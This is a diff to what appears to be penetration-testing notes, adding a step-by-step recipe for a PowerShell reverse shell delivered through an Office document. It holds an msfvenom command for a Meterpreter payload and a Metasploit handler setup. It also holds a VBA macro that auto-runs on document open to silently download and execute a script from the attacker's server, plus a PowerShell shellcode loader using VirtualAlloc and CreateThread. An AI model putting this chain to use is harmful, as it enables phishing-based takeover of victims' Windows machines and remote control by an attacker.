@@ -117,12 +117,64 @@ End Sub
 ```
 </details>
 
-## .ps1 reverse shell
+### .ps1 reverse shell
 <details>
 1. generate the shellcode: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f ps1`
-2. put this in your office document
-</details>
+2. `msfconsole` -> `use exploit/multi/handler` -> `set PAYLOAD windows/x64/meterpreter/reverse_https` -> `set LHOST <kali ip>` -> `set LPORT <port>` -> `exploit`
+3. In Kali, run `python3 -m http.server <port of your choice>`
+4. put this in your VBA
 ```
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://<kali ip>:<http port>/run.ps1') | IEX"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+4. Save this file as `run.ps1` in the root folder of where u host your python http server
+```
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+        uint flAllocationType, uint flProtect);
+        
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
+            uint dwCreationFlags, IntPtr lpThreadId);
+            
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
+        UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type $Kernel32
+<output from 1 here>
+
+$size = $buf.Length
+
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+</details>
+
 
 
 Credit: [Invicti](https://www.invicti.com/learn/reverse-shell)
